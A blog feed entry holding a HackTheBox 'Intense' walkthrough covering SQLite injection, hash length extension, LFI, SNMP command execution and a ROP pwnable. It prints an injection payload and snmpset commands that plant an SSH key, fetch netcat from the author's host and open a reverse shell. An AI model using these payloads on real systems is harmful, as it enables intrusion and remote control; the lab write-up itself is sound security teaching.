// API callback
random_posts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"http://www.w3.org/2005/Atom","xmlns$openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"http://schemas.google.com/blogger/2008","xmlns$georss":"http://www.georss.org/georss","xmlns$gd":"http://schemas.google.com/g/2005","xmlns$thr":"http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982"},"updated":{"$t":"2021-11-30T16:35:33.972-08:00"},"title":{"type":"text","$t":"Will's Root"},"subtitle":{"type":"html","$t":"Pentesting, CTFs, and Writeups"},"link":[{"rel":"http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=12\u0026max-results=1"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/"},{"rel":"hub","href":"http://pubsubhubbub.appspot.com/"},{"rel":"previous","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=11\u0026max-results=1"},{"rel":"next","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=13\u0026max-results=1"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"generator":{"version":"7.00","uri":"http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"54"},"openSearch$startIndex":{"$t":"12"},"openSearch$itemsPerPage":{"$t":"1"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982.post-7795838468256516036"},"published":{"$t":"2020-11-14T08:58:00.013-08:00"},"updated":{"$t":"2020-11-14T10:15:14.263-08:00"},"title":{"type":"text","$t":"Intense HacktheBox Writeup"},"content":{"type":"html","$t":"\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\u003Cdiv class=\"separator\" style=\"clear: both; text-align: center;\"\u003E\u003Ca href=\"https:\/\/1.bp.blogspot.com\/-DvCmBpM327g\/X6-djbr7WCI\/AAAAAAAABzQ\/yTEbHSm90MYMH6Fgd1ESIq0rAa3u2C7NwCLcBGAsYHQ\/s359\/Capture.JPG\" style=\"margin-left: 1em; margin-right: 1em;\"\u003E\u003Cimg border=\"0\" data-original-height=\"125\" data-original-width=\"359\" src=\"https:\/\/1.bp.blogspot.com\/-DvCmBpM327g\/X6-djbr7WCI\/AAAAAAAABzQ\/yTEbHSm90MYMH6Fgd1ESIq0rAa3u2C7NwCLcBGAsYHQ\/s320\/Capture.JPG\" width=\"320\" \/\u003E\u003C\/a\u003E\u003C\/div\u003E\u003Cp\u003E\u003C\/p\u003E\u003Cp\u003EIntense was a hard box involving some web exploitation techniques such as sqlite injection and hash extension attack, snmp exploitation, as well as an easy pwnable for root. Overall, I thought \u003Ca href=\"https:\/\/www.hackthebox.eu\/home\/users\/profile\/19014\"\u003Esokafr\u003C\/a\u003E did a great job with this box.\u003C\/p\u003E\u003Cp\u003ETo begin, our initial port scan revealed the following ports from masscan:\u003C\/p\u003E\u003Cp\u003E22\/tcp\u0026nbsp; open\u0026nbsp; \u0026nbsp;ssh\u0026nbsp; \u0026nbsp; \u0026nbsp;syn-ack ttl 63\u003C\/p\u003E\u003Cp\u003E80\/tcp\u0026nbsp; open\u0026nbsp; \u0026nbsp;http\u0026nbsp; \u0026nbsp; syn-ack ttl 63\u003C\/p\u003E\u003Cp\u003E161\/tcp closed snmp\u0026nbsp; \u0026nbsp; reset ttl 63\u003C\/p\u003E\u003Cp\u003EOpening up port 80, we see the following:\u003C\/p\u003E\u003Cdiv class=\"separator\" style=\"clear: both; text-align: center;\"\u003E\u003Ca href=\"https:\/\/1.bp.blogspot.com\/-Pa7G5n6ZQFY\/X6-eBc60puI\/AAAAAAAABzY\/8wsYh71Vp8IQKVwe2qs-I1lBf58gMgfkACLcBGAsYHQ\/s1385\/site.JPG\" style=\"margin-left: 1em; margin-right: 1em;\"\u003E\u003Cimg border=\"0\" data-original-height=\"468\" data-original-width=\"1385\" height=\"216\" src=\"https:\/\/1.bp.blogspot.com\/-Pa7G5n6ZQFY\/X6-eBc60puI\/AAAAAAAABzY\/8wsYh71Vp8IQKVwe2qs-I1lBf58gMgfkACLcBGAsYHQ\/w640-h216\/site.JPG\" width=\"640\" \/\u003E\u003C\/a\u003E\u003C\/div\u003E\u003Cbr \/\u003E\u003Cp\u003EIt provides us with guest:guest as credentials, as well as a link to the zipped source code, which we can download. Inside, you can find some templates and other misc. info, but the most important files are the 4 python files of this flask app (which uses a sqlite database): utils.py, lwt.py, app.py, and admin.py.\u003C\/p\u003E\u003Cp\u003ESome important takeaways from this include the following observations:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=web_1.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003EThe user information from here is stored in the sqlite database, based on the data for username and secret (which is the sha256 hash of your input for password). The usage of query_db() and its behavior makes it safe from sqli at this login point.\u003C\/p\u003E\u003Cp\u003EThe session is built and checked in the following manner at some of the following functions:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=web_2.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003ETo summarize, the cookie is composed of an “auth” cookie, which is composed of 2 base64 portions separated by a period. The first portion is based on the return value of try_login(), which is a dictionary of username and secret. Using this dictionary, it formats the session as username=username;secret=hash;. Afterwards, the cookie gets a signature from the previous data by taking the digest of sha256(SECRET + data) where SECRET is a random bytestring of random length between 8 and 15; this is the second portion of the cookie. Then both the data and this signature are encoded and returned for the cookie value of “auth.” In many subsequent operations, get_session() is called, which calls parse_session(), which first verifies the contents of the data with the signature. Interestingly enough, if you find a way to bypass this verification, the way parse_session() behaves would allow you to append data to replace keys that get already set in the loop beforehand.\u003C\/p\u003E\u003Cp\u003EBecoming admin lets you interact with some interesting functionality:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=web_3.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003EThere's a ridiculously obvious lfi here. Now, would there be any endpoints that would allow us to extract data to become admin?\u003C\/p\u003E\u003Cp\u003ELet's take a look at a feature the guest user has access to, the submitmessage() function:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=web_4.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003EYou're restricted to a 140 byte message, and there are some blacklisted words. However, now query_db isn't even really used “correctly,\" as the application is just directly formatting your input in, leading to an obvious sqlite injection. One thing to note is that it doesn't really show you the result besides success or failure, so this is a clear case of a error based injection. I just used load_extension when the comparison in my error brute force is false; this would return an authorization error (plus the extension won't even exist). My teammate \u003Ca href=\"https:\/\/www.hackthebox.eu\/profile\/18907\" target=\"_blank\"\u003EBianca\u003C\/a\u003E had another interesting way to error brute this, relying on passing bad inputs to json_extract when the comparison fails to trigger an error.\u003C\/p\u003E\u003Cp\u003EMessing around briefly in \u003Ca href=\"https:\/\/www.db-fiddle.com\/\"\u003Edb-fiddle\u003C\/a\u003E, I will be basing my script off the following sqli template:\u003C\/p\u003E\u003Cp\u003Einjection: ' or (select case when (select substr(username,1,1) from users limit 1 offset 0) = 'a' then 'W' else load_extension('L', 0x1) end));--\u003C\/p\u003E\u003Cp\u003Equery: insert into messages values ('' or (select case when (select substr(username,1,1) from users limit 1 offset 0) = 'a' then 'W' else load_extension('L', 0x1) end));--')\u003C\/p\u003E\u003Cp\u003EI wrote the following script to retrieve the admin username and hash with a simple linear brute, as the username probably will just be admin, and the hex charset is small enough:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=secret_leaker.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003EI ended up recieving the following hash: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105\u003C\/p\u003E\u003Cp\u003EBut it's not crackable with any wordlist or rule combination I have... this is where the way the application signs sessions and checks them comes in. Remember how it signed it with the secret in front before hashing? Under these conditions, sha256 is vulnerable to the hash extension attack. This \u003Ca href=\"https:\/\/blog.skullsecurity.org\/2012\/everything-you-need-to-know-about-hash-length-extension-attacks\"\u003Epost\u003C\/a\u003E explains this attack much better, as I just ended up relying on the \u003Ca href=\"https:\/\/github.com\/iagox86\/hash_extender\" target=\"_blank\"\u003Ehash_extender\u003C\/a\u003E tool. In our case, we know the hash function, the data, as well as the original signature, so we have all the conditions ready for this attack, in which we append data to it to generate a valid signature without knowing the secret (and appending the data can make us admin since the session parser doesn't check for duplicates). As for the attack, the general gist is that if you know the state of a hash, you can create a valid hash with appended data to the input to the function by setting the hashing algorithm state back to the signature's value, so the algorithm continues to hash from there (and this will produce a valid result!).\u003C\/p\u003E\u003Cp\u003ESince the secret is a variable length, I wrote the following script to bruteforce a valid session:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=session_pwn.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003ENow, with a valid session, we can go to the admin functions and perform lfi.\u003C\/p\u003E\u003Cp\u003EWith some requests, I also noticed the user flag (and the source code for the pwnable) in the user directory with payload ..\/..\/..\/..\/..\/..\/..\/..\/..\/home\/user.\u003C\/p\u003E\u003Cp\u003ERecalling our earlier enumeration, I remember the snmp port. Pulling out \/etc\/snmp\/snmpd.conf, I see the following:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=snmpd.conf\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003ESeeing the rw communitstring made me immediately think of rce over snmp, which is very well documented \u003Ca href=\"https:\/\/medium.com\/rangeforce\/snmp-arbitrary-command-execution-19a6088c888e\" target=\"_blank\"\u003Ehere\u003C\/a\u003E. To quote the article:\u003C\/p\u003E\u003Cp\u003EThe SNMP community string is essentially a plaintext password that allows access to a device’s statistics and configuration.\u003C\/p\u003E\u003Cp\u003ESince there is a length limit to the payloads (255 chars for command) with nsExtend related operations, I ended up generating a shorter ssh key to give myself ssh access as the Debian-snmp user with the following commands:\u003C\/p\u003E\u003Cp\u003Esnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus.\"command\"'\u0026nbsp; = createAndGo 'nsExtendCommand.\"command\"' = \/bin\/sh 'nsExtendArgs.\"command\"' = '-c \"echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC1VxdqPOpZvaJtuvtTMZJlchmQCLw8cC0tvD79eSlaL0hsS0XRFRaAKFf55UP1SarbED+teHFQUPbLa6uJlBxJQrPLQfujmo6su7P2jGPDZrwxIgKA7Om8cUvLXuNdHrTVwze68z7QBCIi6m1ofHBvZJOdWMt6O0idpybWefz7Cw== root@kaliVM \u0026gt; \/dev\/shm\/w\"'\u003C\/p\u003E\u003Cp\u003Esnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus.\"command\"'\u0026nbsp; = createAndGo 'nsExtendCommand.\"command\"' = \/bin\/sh 'nsExtendArgs.\"command\"' = '-c \"cat \/dev\/shm\/w \u0026gt; \/var\/lib\/snmp\/.ssh\/authorized_keys\"'\u003C\/p\u003E\u003Cp\u003ERemember to trigger it each time with: snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 nsExtendObjects\u003C\/p\u003E\u003Cp\u003EWhen you lfi the source code of the pwnable (note_server.c) earlier on, you can see that it opened its port on 5001, so we can port forward it out:\u003C\/p\u003E\u003Cp\u003Essh -N -L 5001:127.0.0.1:5001 Debian-snmp@intense.htb -i key\u003C\/p\u003E\u003Cp\u003EHowever, we still need libc and the binary, and from the lfi on passwd, we know Debian-snmp shell is \/bin\/false. So I ended up popping a shell with the following commands so I can transfer files out (we had to use nohup to prevent snmp from hanging and then crashing, and some fiddling was required for the commands to work):\u003C\/p\u003E\u003Cp\u003Esnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus.\"command\"'\u0026nbsp; = createAndGo 'nsExtendCommand.\"command\"' = \/usr\/bin\/nohup 'nsExtendArgs.\"command\"' =\u0026nbsp; 'wget http:\/\/10.10.14.9\/nc -q -O \/dev\/shm\/nc'\u003C\/p\u003E\u003Cp\u003Esnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus.\"command\"'\u0026nbsp; = createAndGo 'nsExtendCommand.\"command\"' = \/usr\/bin\/nohup 'nsExtendArgs.\"command\"' = 'chmod +x \/dev\/shm\/nc'\u003C\/p\u003E\u003Cp\u003Esnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 'nsExtendStatus.\"command\"'\u0026nbsp; = createAndGo 'nsExtendCommand.\"command\"' = \/usr\/bin\/nohup 'nsExtendArgs.\"command\"' = '\/dev\/shm\/nc 10.10.14.9 1337 -e \/bin\/sh'\u003C\/p\u003E\u003Cp\u003EThe following was the source:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=note_server.c\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cp\u003EThis is just a variation of the previous forking stack overflow server pwns I've written extensively about in both my \u003Ca href=\"https:\/\/www.willsroot.io\/2020\/05\/rope-hackthebox-writeup.html\" target=\"_blank\"\u003ERope\u003C\/a\u003E and \u003Ca href=\"https:\/\/www.willsroot.io\/2020\/05\/patents-hackthebox-writeup.html\" target=\"_blank\"\u003EPatents\u003C\/a\u003E writeup, so I'll skim through this pwn. It's another forking note app, with PIE, FULL RELRO, and canary (which is trivial to beat once you leak since it is forking).\u003C\/p\u003E\u003Cp\u003EYour options are ‘\\x01’ for write, ‘\\x02’ for copy, and ‘\\x03’ for show. When you write data, you tell it the length, and it adds the length to an index to check if their sum is over the buffer size. If it's not, you can send in data with specified length size to the note char array starting at the current index, and it increments your index by the buffer size you requested. Do note that you can only send in a byte for the requested size.\u003C\/p\u003E\u003Cp\u003EFor copy, you get 2 bytes to specify an offset, and the offset is checked to remain in the range of 0 and the current index. However, the size to be copied isn't checked, so there is a potential overflow once it copies from the note buffer at the specified offset to the note buffer at the current index. It also increases the index by the specified copy amount, so we can read out of bounds with this as well (as show doesn't check).\u003C\/p\u003E\u003Cp\u003EFor show, there isn't nothing much to know except that it writes out data and returns, so the fork ends.\u003C\/p\u003E\u003Cp\u003EIn my exploit, I basically first increased the index to 1024 and abused copy's lack of checks to extend the index so that the buffer printed with option 3 will leak canary, stack addresses, and pie base. Then I wrote a rop chain with proper padding and canary in front to leak libc addresses in the front of the buffer (and adjusted it to increase the index to 1024), then had it copy the length of the rop itself from offset 0 to the current index (1024), allowing for an overflow to leak libc once we trigger a return with show. Then apply the same principle to dup2 the file descriptors and pop open a shell. Here is my final script:\u003C\/p\u003E\u003Cp\u003E\u003Cscript src=\"https:\/\/gist.github.com\/BitsByWill\/29a824d81f6abdb4507a236dd6ae6bf3.js?file=intense_rooooooot.py\"\u003E\u003C\/script\u003E\u003C\/p\u003E\u003Cdiv class=\"separator\" style=\"clear: both; text-align: center;\"\u003E\u003Ca href=\"https:\/\/1.bp.blogspot.com\/-BNd6AkZXyZ0\/X6-hMYcpwpI\/AAAAAAAABzk\/3HM91UXnqDYCiZxceCjGkll_aT_7hflagCLcBGAsYHQ\/s1183\/rooooot.JPG\" style=\"margin-left: 1em; margin-right: 1em;\"\u003E\u003Cimg border=\"0\" data-original-height=\"419\" data-original-width=\"1183\" height=\"226\" src=\"https:\/\/1.bp.blogspot.com\/-BNd6AkZXyZ0\/X6-hMYcpwpI\/AAAAAAAABzk\/3HM91UXnqDYCiZxceCjGkll_aT_7hflagCLcBGAsYHQ\/w640-h226\/rooooot.JPG\" width=\"640\" \/\u003E\u003C\/a\u003E\u003C\/div\u003E\u003Cp\u003E\u003Cbr \/\u003E\u003C\/p\u003E\u003Cp\u003EAnd that should get us root shell! Thanks once again to sokafr for the fun box, and pottm and \u003Ca href=\"https:\/\/twitter.com\/bjornmortenmoan\" target=\"_blank\"\u003Ebjornmorten\u003C\/a\u003E for giving my writeup a read through before publishing.\u003C\/p\u003E"},"link":[{"rel":"replies","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/7795838468256516036\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"https:\/\/www.willsroot.io\/2020\/11\/intense-hackthebox-writeup.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/7795838468256516036"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default\/7795838468256516036"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/2020\/11\/intense-hackthebox-writeup.html","title":"Intense HacktheBox Writeup"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"media$thumbnail":{"xmlns$media":"http://search.yahoo.com/mrss/","url":"https:\/\/1.bp.blogspot.com\/-DvCmBpM327g\/X6-djbr7WCI\/AAAAAAAABzQ\/yTEbHSm90MYMH6Fgd1ESIq0rAa3u2C7NwCLcBGAsYHQ\/s72-c\/Capture.JPG","height":"72","width":"72"},"thr$total":{"$t":"0"}}]}});